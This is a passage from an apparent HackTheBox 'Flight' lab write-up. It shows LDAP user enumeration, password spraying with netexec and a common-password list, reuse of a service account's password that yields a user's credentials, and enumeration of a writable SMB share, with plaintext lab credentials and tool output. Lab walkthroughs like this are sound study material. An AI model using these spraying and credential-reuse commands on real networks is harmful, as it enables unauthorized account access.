</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>Administrator<span class="w">                 </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:17:02<span class="w"> </span><span class="m">22</span><span class="w">      </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>administering<span class="w"> </span>the<span class="w"> </span>computer/domain<span class="w">      </span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>Guest<span class="w">                         </span>&lt;never&gt;<span class="w">             </span><span class="m">22</span><span class="w">      </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain<span class="w">    </span>
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>krbtgt<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">19</span>:48:01<span class="w"> </span><span class="m">22</span><span class="w">      </span>Key<span class="w"> </span>Distribution<span class="w"> </span>Center<span class="w"> </span>Service<span class="w"> </span>Account<span class="w">                     </span>
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>S.Moon<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Junion<span class="w"> </span>Web<span class="w"> </span>Developer<span class="w">                                        </span>
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>R.Cold<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>HR<span class="w"> </span>Assistant<span class="w">                                                </span>
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>G.Lors<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Sales<span class="w"> </span>manager<span class="w">                                               </span>
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>L.Kein<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Penetration<span class="w"> </span>tester<span class="w">                                          </span>
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>M.Gold<span class="w">                        </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Sysadmin<span class="w">                                                    </span>
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>C.Bum<span class="w">                         </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Senior<span class="w"> </span>Web<span class="w"> </span>Developer<span class="w">                                        </span>
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>W.Walker<span class="w">                      </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Payroll<span class="w"> </span>officer<span class="w">                                             </span>
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>I.Francis<span class="w">                     </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Nobody<span class="w"> </span>knows<span class="w"> </span>why<span class="w"> </span>he<span class="err">&#39;</span>s<span class="w"> </span>here<span class="w">                                  </span>
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>D.Truff<span class="w">                       </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Project<span class="w"> </span>Manager<span class="w">                                             </span>
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>V.Stevens<span class="w">                     </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:22<span class="w"> </span><span class="m">22</span><span class="w">      </span>Secretary<span class="w">                                                   </span>
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>svc_apache<span class="w">                    </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:23<span class="w"> </span><span class="m">0</span><span class="w">       </span>Service<span class="w"> </span>Apache<span class="w"> </span>web<span class="w">                                          </span>
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>O.Possum<span class="w">                      </span><span class="m">2022</span>-09-22<span class="w"> </span><span class="m">20</span>:08:23<span class="w"> </span><span class="m">22</span><span class="w">      </span>Helpdesk<span class="w">    </span>
</span></code></pre></div>
<p>No credentials found or any other useful info on the LDAP description</p>
<hr />
<h1 id="foothold">Foothold</h1>
<h2 id="password-spraying">Password spraying</h2>
<p>using this wordlist</p>
<p>We have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>wget<span class="w"> </span><span class="o">[</span>https://raw.githubusercontent.com/insidetrust/statistically-likely-<span class="o">](</span>https://raw.githubusercontent.com/insidetrust/statistically-likely-<span class="o">)</span>usernames/master/weak-corporate-passwords/english-basic.txt
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>cat<span class="w"> </span>users.txt<span class="w"> </span>&gt;&gt;<span class="w"> </span>english-basic.txt
</span></code></pre></div>
<p>Also add the password of <code>svc_apache</code> to check for <code>password reuse</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>english-basic.txt
</span></code></pre></div>
<p>now that we have the valid users, lets do some password spraying</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>flight.htb-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>english-basic.txt<span class="w"> </span>--continue-on-success
</span></code></pre></div>
<p>great! it appears that password reuse is taking place and user <code>S.Moon</code> had the same password as <code>svc_apache</code> ! creds obtained:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>S.Moon
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>S@Ss!K@*t13
</span></code></pre></div>
<h2 id="checking-where-we-can-login-with-smoon-creds">Checking where we can login with S.Moon creds</h2>
<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: <a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>flight.htb<span class="w"> </span><span class="s1">&#39;S.Moon&#39;</span><span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.Moon:S@Ss!K@*t13
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.Moon:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.Moon:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a>
</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a>
</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-48-21"><a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-48-22"><a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.Moon:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-48-23"><a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a>
</span><span id="__span-48-24"><a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-25"><a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-48-26"><a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a>
</span><span id="__span-48-27"><a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-28"><a id="__codelineno-48-28" name="__codelineno-48-28" href="#__codelineno-48-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-48-29"><a id="__codelineno-48-29" name="__codelineno-48-29" href="#__codelineno-48-29"></a>
</span><span id="__span-48-30"><a id="__codelineno-48-30" name="__codelineno-48-30" href="#__codelineno-48-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-31"><a id="__codelineno-48-31" name="__codelineno-48-31" href="#__codelineno-48-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-48-32"><a id="__codelineno-48-32" name="__codelineno-48-32" href="#__codelineno-48-32"></a>
</span><span id="__span-48-33"><a id="__codelineno-48-33" name="__codelineno-48-33" href="#__codelineno-48-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-34"><a id="__codelineno-48-34" name="__codelineno-48-34" href="#__codelineno-48-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-48-35"><a id="__codelineno-48-35" name="__codelineno-48-35" href="#__codelineno-48-35"></a>
</span><span id="__span-48-36"><a id="__codelineno-48-36" name="__codelineno-48-36" href="#__codelineno-48-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-48-37"><a id="__codelineno-48-37" name="__codelineno-48-37" href="#__codelineno-48-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div>
<p>We can login towards <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, here we go again…</p>
<h2 id="smb-enumeration-as-smoon">SMB enumeration as S.Moon</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>flight.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;S.Moon&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>--shares
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.Moon:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Shared<span class="w">          </span>READ,WRITE<span class="w">      </span>
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Users<span class="w">           </span>READ<span class="w">            </span>
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Web<span class="w">             </span>READ
</span></code></pre></div>
<p>Thats different now, this user was also <code>WRITE</code> permissions to the share <code>Shared</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>smbclient<span class="w"> </span>//flight.htb/shared<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;s.moon%S@Ss!K@*t13&#39;</span>
</span></code></pre></div>
<p>First lets inspect the share,</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">19</span>:55:34<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Aug<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">19</span>:55:34<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
